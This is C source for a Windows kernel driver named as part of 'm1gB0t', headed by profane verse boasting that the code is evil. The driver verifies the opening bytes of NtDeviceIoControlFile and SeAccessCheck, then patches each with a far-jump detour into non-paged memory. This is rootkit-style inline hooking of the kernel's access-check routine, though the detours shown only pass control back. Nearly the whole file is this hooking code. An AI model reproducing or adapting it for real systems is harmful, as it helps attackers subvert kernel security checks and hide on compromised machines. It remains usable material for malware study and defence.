
/////////////////////////////////////////////////////////////////////////
// migsys, kernel part of m1gB0t, Greg Hoglund, 2004
//
// I got the blackhat style
// my code is evil and elite
// with capitalized guile
// fuckn the welfare vendors
// and their mothefuckin deceit
// hide behind the mask of good-will-defender
// I cut like a file
// slow hone on your vulns 
// This aint no fuzz
// This is deeper
// I'm in your states
// like the motherfukn Reaper
// You want something for free?
// pay naught for my pursuit?
// my mission occupation
// gonna put me in refute
// your gonna come along
// cuz this is bigger than you
// its gonna take you by balls
// your paybacks are due 
/////////////////////////////////////////////////////////////////////////

#include "ntddk.h"

NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG DeviceIoControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);

NTSTATUS CheckFunctionBytesNtDeviceIoControlFile()
{
	int i=0;
	char *p = (char *)NtDeviceIoControlFile;

	//The beginning of the NtDeviceIoControlFile function
	//should match: 
	//55		PUSH EBP
	//8BEC		MOV	EBP, ESP
	//6A01		PUSH 01
	//FF752C	PUSH DWORD PTR [EBP + 2C]
	
	char c[] = { 0x55, 0x8B, 0xEC, 0x6A, 0x01, 0xFF, 0x75, 0x2C };

	while(i<8)
	{
		DbgPrint(" - 0x%02X ", (unsigned char)p[i]);
		if(p[i] != c[i])
		{
			return STATUS_UNSUCCESSFUL; 
		}
		i++;
	}
	return STATUS_SUCCESS;
}

NTSTATUS CheckFunctionBytesSeAccessCheck()
{
	int i=0;
	char *p = (char *)SeAccessCheck;

	//The beginning of the SeAccessCheck function
	//should match: 
	//55		PUSH EBP
	//8BEC		MOV	EBP, ESP
	//53		PUSH EBX
	//33DB		XOR EBX, EBX
	//385D24	CMP [EBP+24], BL
	char c[] = { 0x55, 0x8B, 0xEC, 0x53, 0x33, 0xDB, 0x38, 0x5D, 0x24 };

	while(i<9)
	{
		DbgPrint(" - 0x%02X ", (unsigned char)p[i]);
		if(p[i] != c[i])
		{
			return STATUS_UNSUCCESSFUL; 
		}
		i++;
	}
	return STATUS_SUCCESS;
}

// naked functions have no prolog/epilog code - they are functionally like the 
// target of a goto statement
__declspec(naked) my_function_detour_seaccesscheck()
{
	__asm
	{		
		// exec missing instructions
		push	ebp
		mov		ebp, esp
		push	ebx
		xor		ebx, ebx
		cmp		[ebp+24], bl

		// jump to re-entry location in hooked function
		// this gets 'stamped' with the correct address
		// at runtime.
		//
		// we need to hard-code a far jmp, but the assembler
		// that comes with the DDK will not poop this out
		// for us, so we code it manually
		// jmp FAR 0x08:0xAAAAAAAA
		_emit 0xEA
		_emit 0xAA
		_emit 0xAA
		_emit 0xAA
		_emit 0xAA
		_emit 0x08
		_emit 0x00
	}
}

// We read this function into non-paged memory
// before we place the detour.  It seems that the
// driver code gets paged now and then, which is bad
// for children and other living things.
__declspec(naked) my_function_detour_ntdeviceiocontrolfile()
{
	__asm
	{		
		// exec missing instructions
		push	ebp
		mov		ebp, esp
		push	0x01
		push	dword ptr [ebp+0x2C]

		// jump to re-entry location in hooked function
		// this gets 'stamped' with the correct address
		// at runtime.
		//
		// we need to hard-code a far jmp, but the assembler
		// that comes with the DDK will not poop this out
		// for us, so we code it manually
		// jmp FAR 0x08:0xAAAAAAAA
		_emit 0xEA
		_emit 0xAA
		_emit 0xAA
		_emit 0xAA
		_emit 0xAA
		_emit 0x08
		_emit 0x00
	}
}

VOID DetourFunctionSeAccessCheck()
{
	char *actual_function = (char *)SeAccessCheck;
	char *non_paged_memory;
	unsigned long detour_address;
	unsigned long reentry_address;
	int i = 0;

	// assembles to jmp far 0008:11223344 where 11223344 is address of
	// our detour function, plus two NOP's to align up the patch
	char newcode[] = { 0xEA, 0x44, 0x33, 0x22, 0x11, 0x08, 0x00, 0x90, 0x90 };

	// reenter the hooked function at a location past the overwritten opcodes
	// alignment is, of course, very important here
	reentry_address = ((unsigned long)SeAccessCheck) + 9; 

	non_paged_memory = ExAllocatePool(NonPagedPool, 256);
	
	// copy contents of our function into non paged memory
	// with a cap at 256 bytes (beware of possible read off end of page FIXME)
	for(i=0;i<256;i++)
	{
		((unsigned char *)non_paged_memory)[i] = ((unsigned char *)my_function_detour_seaccesscheck)[i];
	}

	detour_address = (unsigned long)non_paged_memory;
	
	// stamp in the target address of the far jmp
	*( (unsigned long *)(&newcode[1]) ) = detour_address;

	// now, stamp in the return jmp into our detour
	// function
	for(i=0;i<200;i++)
	{
		if( (0xAA == ((unsigned char *)non_paged_memory)[i]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+1]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+2]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+3]))
		{
			// we found the address 0xAAAAAAAA
			// stamp it w/ the correct address
			*( (unsigned long *)(&non_paged_memory[i]) ) = reentry_address;
			break;
		}
	}

	//TODO, raise IRQL

	//overwrite the bytes in the kernel function
	//to apply the detour jmp
	for(i=0;i < 9;i++)
	{
		actual_function[i] = newcode[i];
	}

	//TODO, drop IRQL
}

VOID DetourFunctionNtDeviceIoControlFile()
{
	char *actual_function = (char *)NtDeviceIoControlFile;
	char *non_paged_memory;
	unsigned long detour_address;
	unsigned long reentry_address;
	int i = 0;

	// assembles to jmp far 0008:11223344 where 11223344 is address of
	// our detour function, plus one NOP to align up the patch
	char newcode[] = { 0xEA, 0x44, 0x33, 0x22, 0x11, 0x08, 0x00, 0x90 };

	// reenter the hooked function at a location past the overwritten opcodes
	// alignment is, of course, very important here
	reentry_address = ((unsigned long)NtDeviceIoControlFile) + 8; 

	non_paged_memory = ExAllocatePool(NonPagedPool, 256);
	
	// copy contents of our function into non paged memory
	// with a cap at 256 bytes (beware of possible read off end of page FIXME)
	for(i=0;i<256;i++)
	{
		((unsigned char *)non_paged_memory)[i] = ((unsigned char *)my_function_detour_ntdeviceiocontrolfile)[i];
	}

	detour_address = (unsigned long)non_paged_memory;
	
	// stamp in the target address of the far jmp
	*( (unsigned long *)(&newcode[1]) ) = detour_address;

	// now, stamp in the return jmp into our detour
	// function
	for(i=0;i<200;i++)
	{
		if( (0xAA == ((unsigned char *)non_paged_memory)[i]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+1]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+2]) &&
			(0xAA == ((unsigned char *)non_paged_memory)[i+3]))
		{
			// we found the address 0xAAAAAAAA
			// stamp it w/ the correct address
			*( (unsigned long *)(&non_paged_memory[i]) ) = reentry_address;
			break;
		}
	}

	//TODO, raise IRQL

	//overwrite the bytes in the kernel function
	//to apply the detour jmp
	for(i=0;i < 8;i++)
	{
		actual_function[i] = newcode[i];
	}

	//TODO, drop IRQL
}

VOID UnDetourFunction()
{
	//TODO!
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("My Driver Unloaded!");

	UnDetourFunction();
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DbgPrint("My Driver Loaded!");
	
	// TODO!! theDriverObject->DriverUnload = OnUnload;

	if(STATUS_SUCCESS != CheckFunctionBytesNtDeviceIoControlFile())
	{
		DbgPrint("Match Failure on NtDeviceIoControlFile!");
		return STATUS_UNSUCCESSFUL;
	}

	if(STATUS_SUCCESS != CheckFunctionBytesSeAccessCheck())
	{
		DbgPrint("Match Failure on SeAccessCheck!");
		return STATUS_UNSUCCESSFUL;
	}
	
	DetourFunctionNtDeviceIoControlFile();
	DetourFunctionSeAccessCheck();

	return STATUS_SUCCESS;
}
